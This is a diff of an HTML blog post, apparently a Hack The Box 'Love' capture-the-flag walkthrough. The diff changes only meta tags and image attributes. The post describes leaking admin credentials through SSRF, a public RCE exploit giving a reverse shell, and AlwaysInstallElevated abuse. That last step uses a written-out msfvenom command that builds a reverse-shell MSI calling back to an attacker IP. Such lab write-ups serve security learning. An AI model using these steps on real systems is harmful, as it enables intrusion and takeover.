@@ -1,7 +1,19 @@
 <!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>HTB: Love | HackWithJordan</title><style>
+    <title>HTB: Love | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine Love, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-04-23-Love(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: Love">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine Love, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-04-23-Love(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-04-23">
+    <!-- /site-meta --><style>
         :root {
             --bg: #0b0e14;
             --accent: #5eead4;
@@ -291,7 +303,7 @@
             <div class="post-meta">April 23, 2024 &bull; HTB</div>
         </header>
 
-<p>Accessing the http site we have nothing, its just a default apache page. If we access the https site we can see a certificate which provides us a subdomain of <a href="http://staging.love.htb">http://staging.love.htb</a></p><p><img src="../img/posts/2024-04-23-Love(HTB)/01-4811e52ce5.jpg"></p><p>&nbsp;</p><p>Port 5000 is a webpage but we cannot access it. I can use the scanner though to leak whats on the website. I had originally tried the direct IP to port 5000 but got access denied, then I tried localhost on other pages other than port 5000 so I had to cheat and look at 0xdf's walkthrough. Simple mistake.</p><p><img src="../img/posts/2024-04-23-Love(HTB)/02-c8d4c2c36f.png">&nbsp;</p><p>admin:<strong>@LoveIsInTheAir!!!!</strong></p><p>We can then login to the admin page and we have an RCE exploit which we can find with searchsploit.</p><p><img src="../img/posts/2024-04-23-Love(HTB)/03-cb47d24a4e.jpg"></p><p>We have to edit the script a little bit to go to the proper path and put our IP and creds in. But it works and we get a reverse shell.</p><p><img src="../img/posts/2024-04-23-Love(HTB)/04-27b5139cab.jpg"></p><p>We download linpeas and run it, we see alwaysinstallelevated is on. This means we can download a shell and it will be installed as admin</p><p><img src="../img/posts/2024-04-23-Love(HTB)/05-0cca9c6e54.jpg"></p><p>&nbsp;</p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.20 LPORT=9998 -a x64 --platform Windows -f msi -o evil.msi</p><p>&nbsp;</p><p>Upload the evil.msi to the machine and run it and we get system</p><p><img src="../img/posts/2024-04-23-Love(HTB)/06-440abaad63.jpg"></p>
+<p>Accessing the http site we have nothing, its just a default apache page. If we access the https site we can see a certificate which provides us a subdomain of <a href="http://staging.love.htb">http://staging.love.htb</a></p><p><img src="../img/posts/2024-04-23-Love(HTB)/01-4811e52ce5.jpg"></p><p>&nbsp;</p><p>Port 5000 is a webpage but we cannot access it. I can use the scanner though to leak whats on the website. I had originally tried the direct IP to port 5000 but got access denied, then I tried localhost on other pages other than port 5000 so I had to cheat and look at 0xdf's walkthrough. Simple mistake.</p><p><img loading="lazy" decoding="async" src="../img/posts/2024-04-23-Love(HTB)/02-c8d4c2c36f.png">&nbsp;</p><p>admin:<strong>@LoveIsInTheAir!!!!</strong></p><p>We can then login to the admin page and we have an RCE exploit which we can find with searchsploit.</p><p><img loading="lazy" decoding="async" src="../img/posts/2024-04-23-Love(HTB)/03-cb47d24a4e.jpg"></p><p>We have to edit the script a little bit to go to the proper path and put our IP and creds in. But it works and we get a reverse shell.</p><p><img loading="lazy" decoding="async" src="../img/posts/2024-04-23-Love(HTB)/04-27b5139cab.jpg"></p><p>We download linpeas and run it, we see alwaysinstallelevated is on. This means we can download a shell and it will be installed as admin</p><p><img loading="lazy" decoding="async" src="../img/posts/2024-04-23-Love(HTB)/05-0cca9c6e54.jpg"></p><p>&nbsp;</p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.20 LPORT=9998 -a x64 --platform Windows -f msi -o evil.msi</p><p>&nbsp;</p><p>Upload the evil.msi to the machine and run it and we get system</p><p><img loading="lazy" decoding="async" src="../img/posts/2024-04-23-Love(HTB)/06-440abaad63.jpg"></p>
     </article>
 
 <script>
